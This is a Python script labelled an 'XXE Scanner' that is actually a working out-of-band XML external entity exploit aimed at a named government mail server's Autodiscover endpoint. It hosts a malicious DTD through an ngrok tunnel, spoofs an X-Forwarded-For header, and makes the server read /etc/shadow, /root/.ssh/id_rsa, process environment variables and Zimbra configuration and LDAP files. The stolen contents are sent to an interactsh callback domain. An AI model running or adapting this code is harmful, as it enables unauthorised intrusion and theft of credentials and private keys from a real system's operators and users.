#!/usr/bin/env python3
import os
import sys
import time
import threading
import requests
import subprocess
from http.server import HTTPServer, SimpleHTTPRequestHandler

# Configuration
TARGET_URL = "https://mail.aarogyasri.gov.in/Autodiscover/Autodiscover.xml"
INTERACTSH_DOMAIN = "d1k8q54ubu236jq8tsugr7hqxw7cbinku.oast.me"
LOCAL_PORT = 8080
WAIT_TIME = 60  # Seconds to wait for callbacks

# Payload templates
XXE_PAYLOAD = """<!DOCTYPE autodiscover [
  <!ENTITY %% remote SYSTEM "{dtd_url}">
  %%remote;
]>
<autodiscover xmlns="http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a">
  <Request>
    <EMailAddress>
      &exfiltrate1;
      &exfiltrate2;
      &exfiltrate3;
    </EMailAddress>
    <AcceptableResponseSchema>http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a</AcceptableResponseSchema>
  </Request>
</autodiscover>"""

DTD_TEMPLATE = """<!ENTITY %% file1 SYSTEM "{file1}">
<!ENTITY %% file2 SYSTEM "{file2}">
<!ENTITY %% file3 SYSTEM "{file3}">

<!ENTITY %% oob1 "<!ENTITY exfiltrate1 SYSTEM 'http://{interactsh_domain}/?leak=file1-%%file1;'>">
<!ENTITY %% oob2 "<!ENTITY exfiltrate2 SYSTEM 'http://{interactsh_domain}/?leak=file2-%%file2;'>">
<!ENTITY %% oob3 "<!ENTITY exfiltrate3 SYSTEM 'http://{interactsh_domain}/?leak=file3-%%file3;'>">

%%oob1;
%%oob2;
%%oob3;"""

# File targets to test
FILE_TARGETS = [
    ("file:///etc/passwd", "file:///etc/hostname", "file:///opt/zimbra/conf/localconfig.xml"),
    ("file:///etc/shadow", "file:///proc/self/environ", "file:///opt/zimbra/log/mailbox.log"),
    ("file:///root/.ssh/id_rsa", "file:///opt/zimbra/conf/zimbra.ldap", "file:///var/log/auth.log")
]

class HTTPHandler(SimpleHTTPRequestHandler):
    def log_request(self, code='-', size='-'):
        # Disable default logging
        pass

def run_http_server(port):
    server = HTTPServer(('', port), HTTPHandler)
    print(f"[+] HTTP server running on port {port}")
    server.serve_forever()

def start_ngrok_tunnel(port):
    try:
        ngrok = subprocess.Popen(
            ["ngrok", "http", str(port)],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE
        )
        time.sleep(3)  # Give ngrok time to initialize
        return ngrok
    except Exception as e:
        print(f"[-] Failed to start ngrok: {e}")
        sys.exit(1)

def generate_dtd(targets, interactsh_domain):
    dtd_content = DTD_TEMPLATE.format(
        file1=targets[0],
        file2=targets[1],
        file3=targets[2],
        interactsh_domain=interactsh_domain
    )
    with open("exploit.dtd", "w") as f:
        f.write(dtd_content)
    print("[+] DTD file generated with targets:")
    print(f"   1. {targets[0]}")
    print(f"   2. {targets[1]}")
    print(f"   3. {targets[2]}")

def send_xxe_payload(target_url, dtd_url):
    headers = {
        "Content-Type": "application/xml",
        "X-Forwarded-For": "127.0.0.1",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
    }
    
    payload = XXE_PAYLOAD.format(dtd_url=dtd_url).replace("%%", "%")
    
    try:
        response = requests.post(
            target_url,
            data=payload,
            headers=headers,
            verify=False,
            timeout=30
        )
        print(f"\n[+] Payload sent to {target_url}")
        print(f"    HTTP Status: {response.status_code}")
        print(f"    Response Length: {len(response.text)}")
        return True
    except Exception as e:
        print(f"[-] Failed to send payload: {e}")
        return False

def main():
    print("[+] Starting XXE Scanner")
    print(f"[*] Target: {TARGET_URL}")
    print(f"[*] Interactsh Domain: {INTERACTSH_DOMAIN}")
    
    # Start HTTP server in background
    http_thread = threading.Thread(target=run_http_server, args=(LOCAL_PORT,))
    http_thread.daemon = True
    http_thread.start()
    
    # Start ngrok tunnel
    ngrok_process = start_ngrok_tunnel(LOCAL_PORT)
    
    try:
        # Get ngrok public URL
        ngrok_url = None
        tunnels = requests.get("http://localhost:4040/api/tunnels").json()
        for tunnel in tunnels["tunnels"]:
            if tunnel["proto"] == "https":
                ngrok_url = tunnel["public_url"]
                break
        
        if not ngrok_url:
            print("[-] Failed to get ngrok URL")
            sys.exit(1)
            
        dtd_url = f"{ngrok_url}/exploit.dtd"
        print(f"[+] Ngrok tunnel created: {dtd_url}")
        
        # Cycle through file targets
        for i, targets in enumerate(FILE_TARGETS):
            print(f"\n[=== Starting Test Cycle {i+1} ===]")
            
            # Generate DTD with current targets
            generate_dtd(targets, INTERACTSH_DOMAIN)
            
            # Send XXE payload
            if send_xxe_payload(TARGET_URL, dtd_url):
                print(f"[*] Waiting {WAIT_TIME}s for callbacks...")
                time.sleep(WAIT_TIME)
    
    except KeyboardInterrupt:
        print("\n[!] Keyboard interrupt detected")
    finally:
        print("\n[+] Cleaning up...")
        ngrok_process.terminate()
        os.remove("exploit.dtd")
        print("[+] Scan completed. Check Interactsh for callbacks")

if __name__ == "__main__":
    main()
